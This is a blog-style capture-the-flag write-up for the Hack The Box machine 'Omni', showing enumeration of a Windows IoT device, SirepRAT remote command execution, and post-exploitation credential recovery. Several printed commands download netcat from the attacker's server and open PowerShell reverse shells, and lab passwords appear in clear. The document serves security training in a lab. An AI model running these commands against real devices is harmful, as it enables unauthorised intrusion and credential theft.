@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Omni&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Omni" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Omni</h1><p class="article date">2021-01-09</p></section><article class="article markdown-body"><h1 id="omni">Omni</h1>
+<p><img  src="img/Omni_Logo.png"
+        alt/></p>
+<p>Omni is a Easy machine from HTB. The info card features a question mark in place of the OS. It&rsquo;s something a little bit different than normal. I would sharpen your PowerShell skill though.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>We start off with an NMAP scan and see a whole bunch of open port on what seems to be a Windows machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.204
+Host is up <span style="color:#f92672">(</span>0.081s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65529</span> filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth:
+| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+|_  Basic realm<span style="color:#f92672">=</span>Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>8/26%Time<span style="color:#f92672">=</span>5F46539B%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>N
+SF:ULL,10,<span style="color:#e6db74">&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,10,<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,10,<span style="color:#e6db74">&#34;\*LY\xa5\xfb`\x0
+</span><span style="color:#e6db74">SF:4G\xa9m\x1c\xc9}\xc8O\x12&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,10,<span style="color:#e6db74">&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\x
+</span><span style="color:#e6db74">SF:c9}\xc8O\x12&#34;</span><span style="color:#f92672">)</span>;
+
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p>We start looking at the ports. RPC looks interesting and we try to get a connection going with rpcclient but we are unsuccessful. Then, we google around trying to find something for ARCserve. No luck again. We check out port 8080 and are greeted by a login prompt.</p>
+<p><img  src="img/Omni_LoginDeviceManagerLogin.png"
+        alt/></p>
+<p>Unfortunately, we have no credentials. At this point, we turn back to google. We search for &ldquo;Windows Device Manager&rdquo; and find some references to Windows IoT. A lightweight version of Windows 10 intended to be used in embedded devices. We now know more about what we are looking at.</p>
+<h2 id="foothold">Foothold</h2>
+<p>We do some more googling here and quickly find a rather interesting GitHub repository.</p>
+<p><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></p>
+<p>It includes an <a href="https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_White_Paper.pdf"target="_blank">awesome white paper</a>and a <a href="https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_Slides.pdf"target="_blank">set of slides.</a></p>
+<p>I won&rsquo;t go into all the details.  However, the basic idea is that if you are connected to the to Windows IoT systems via Ethernet can run commands as system. This is possibly due to Windows IoT having some relation to a windows mobile OS and it&rsquo;s debugging shell that would have been connected to over USB.</p>
+<p>Now we aren&rsquo;t actually connected via Ethernet but from the prospective of Omni we might as well be.</p>
+<p>We clone the repository and start getting it set up. This is a bit tricky because it was written in python2 and is also dependency heck.</p>
+<p>Eventually, we get the required libraries installed, including enum34, and are able to get setup. We start an HTPP python server in the a directory with a windows netcat binary, <code>sudo python -m http.server 80</code>, and a netcat listener with rlwrap to catch out reverse shell, <code>rlwrap nc -lnvp 4436</code>.</p>
+<p>We use SirepRAT to launch a command, providing the the path to PowerShell and use Invoke-WebRequest to retrieve netcat from our python server and save it. We then launch cmd.exe and run our netcat file and pass it the arguments to open a reverse shell with PowerShell to our machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python2 SirepRAT<span style="color:#f92672">.</span>py <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.204</span> LaunchCommandWithOutput <span style="color:#f92672">--</span>return_output <span style="color:#f92672">--</span>cmd <span style="color:#e6db74">&#34;C:\windows\system32\WindowsPowerShell</span><span style="color:#ae81ff">\v</span><span style="color:#e6db74">1.0\powershell.exe&#34;</span> <span style="color:#f92672">--</span>args <span style="color:#e6db74">&#34;/c Invoke-WebRequest -OutFile C:\Windows\System32</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">c78.exe -URI http://10.10.15.40/nc64.exe&#34;</span> <span style="color:#f92672">--</span>vv <span style="color:#f92672">&amp;&amp;</span> python2 SirepRAT<span style="color:#f92672">.</span>py <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.204</span> LaunchCommandWithOutput <span style="color:#f92672">--</span>return_output <span style="color:#f92672">--</span>cmd <span style="color:#e6db74">&#34;C:\windows\system32\cmd.exe&#34;</span> <span style="color:#f92672">--</span>args <span style="color:#e6db74">&#34;/c C:\windows\system32</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">c78.exe 10.10.15.40 4436 -e C:\windows\system32\WindowsPowershell</span><span style="color:#ae81ff">\v</span><span style="color:#e6db74">1.0\powershell.exe&#34;</span> <span style="color:#f92672">--</span>vv
+</code></pre></div><p>And we have a shell at last.</p>
+<p><img  src="img/Omni_ShellatLast.png"
+        alt/></p>
+<h2 id="enumeration-on-the-box">Enumeration on the box</h2>
+<p>Now that we are on the box, it is time to find out flags and figure out how to get them. There is no <code>C:\Users</code> So we run a quick search with PowerShell to find any .txt files.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">PS C:\Users\Public&gt; Get-Childitem -Path C:\ -Include *.txt <span style="color:#f92672">-File</span> -Recurse -ErrorAction SilentlyContinue         
+
+...
+
+Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Data\Users\administrator                                                                                                                                                                          
+
+Mode                LastWriteTime         Length Name                                                           
+----                -------------         ------ ----                                                           
+-ar---         7/4/2020   9<span style="color:#960050;background-color:#1e0010">:</span>48 PM           1958 root.txt
+
+...
+
+    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Data\Users\app
+
+
+Mode                LastWriteTime         Length Name                           
+----                -------------         ------ ----                           
+-ar---         7/4/2020   8<span style="color:#960050;background-color:#1e0010">:</span>20 PM            344 hardening.txt                 
+-ar---         7/4/2020   9<span style="color:#960050;background-color:#1e0010">:</span>53 PM           1958 user.txt
+</code></pre></div><p>We find user.txt and root.txt in <code>C:\Data\Users\app</code> and <code>C:\Data\Users\administrator</code> respectively.</p>
+<p>Running <code>$env:username</code> shows us that we are the user omni so not the same as app but we decide to head over and see if we can snag the flag. Typing it out, we found a slight issue.</p>
+<p><img  src="img/Omni_FlagQuestionMark.png"
+        alt/></p>
+<p>We check through app data, the path variable, and iot-admin.xml but we can&rsquo;t seem to find anything to leverage. I went a bit crazy at this point after checking the forums because there were multiple references to checking the &ldquo;path&rdquo;. However, I was unable to find anything unusual there.</p>
+<p><img  src="img/Omni_Enviroment.png"
+        alt/></p>
+<p>I honestly got stuck here for quite a while. Eventually, I got a nudge to check for hidden batch files which we did with the following command.</p>
+<p><code>PS C:\&gt; Get-ChildItem -Recurse -Filter *.bat -Force</code></p>
+<p>Most of the results from this are things we don&rsquo;t have access to. But there are a few we do. One looks rather suspicious. <code>C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat</code></p>
+<p><em>Side note: From my conversations with a few others, their shells started in  <code>C:\Program Files\WindowsPowerShell\Modules\PackageManagement</code> which probably explains the path reference. I&rsquo;m not sure why mine wasn&rsquo;t there..</em></p>
+<p>We type that file and are created by a beautiful sight, credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement&gt; type r.bat
+type r.bat
+@echo off
+
+<span style="color:#960050;background-color:#1e0010">:</span>LOOP
+
+<span style="color:#66d9ef">for</span> /F <span style="color:#e6db74">&#34;skip=6&#34;</span> %<span style="color:#66d9ef">%</span>i <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;net localgroup &#34;administrators&#34;&#39;</span>) <span style="color:#66d9ef">do</span> net localgroup <span style="color:#e6db74">&#34;administrators&#34;</span> %<span style="color:#66d9ef">%</span>i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping -n 3 127.0.0.1
+
+cls
+
+GOTO <span style="color:#960050;background-color:#1e0010">:</span>LOOP
+
+<span style="color:#960050;background-color:#1e0010">:</span>EXIT
+</code></pre></div><h2 id="user">User</h2>
+<p>We are ready to go for User at last. We head back to port 8080 and login as the user app.</p>
+<p><img  src="img/Omni_AppWindowsDeviceControlPanel.png"
+        alt/></p>
+<p>Under the processes tab, there is an option to &ldquo;Run Command&rdquo; that catches our eye right away. We select that and sure enough we have a forum to fill in to run commands. We kill our current revers shell, restart our listener and then enter the following command.</p>
+<p><code>C:\windows\system32\nc79.exe 10.10.15.40 4436 -e C:\windows\system32\WindowsPowershell\v1.0\powershell.exe</code></p>
+<p><img  src="img/Omni_FailedYouSay.png"
+        alt/></p>
+<p>A moment later, we get notice that the command has failed&hellip; But if we go back over to our listener we can see that we do in fact have a shell.</p>
+<p><img  src="img/Omni_IBegtoDiffer.png"
+        alt/></p>
+<p>It seems the reports of failure were greatly exaggerated.</p>
+<p>We head back to the apps home direction, <code>C:\Data\Users\app</code> and get to work on the file. Despite the ending extension of .txt, you might have noticed user.txt looks more like an xml file.</p>
+<p>The PowerShell cmdlet that imports an xml file and creates a powershell object. <code>Import-CliXML</code> We run that providing user.txt as a path and it tells us, <code>System.Security.SecureString</code> After some research, we learn it  is a saved credential object and can be used to return a password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">$user123 = Import-CliXML -Path .\user.txt
+$user123.GetNerworkCredentials().Password
+</code></pre></div><p>Submit our flag and we got user!</p>
+<h2 id="root">Root</h2>
+<p>Root is nearly identical, as you might have guessed. We follow the same steps to login and get a reverse shell running and then retrieve the administrator passwordfrom root.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">PS C:\Data\Users\administrator&gt; $root123 = Import-CliXML -Path .\root.txt
+$root123 = Import-CliXML -Path .\root.txt
+PS C:\Data\Users\administrator&gt; $root123.GetNetworkCredential().Password
+$root123.GetNetworkCredential().Password
+5dbdce5569e2c4708617c0ce6e9bf11d
+PS C:\Data\Users\administrator&gt;
+</code></pre></div><h2 id="wrap-up">Wrap Up</h2>
+<p>Some people felt that what was after that was a bit CTF ish and I&rsquo;m definitely confused how we were supposed to figure out r.bat when we don&rsquo;t necessarily land in that directory.  I really enjoyed this box however, and it was a excellent opportunity to learn some new PowerShell tricks. Thank you egre55 for creating it!</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/openkeys-writeup/"><span class="iconfont icon-article"></span>HTB OpenKeyS</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
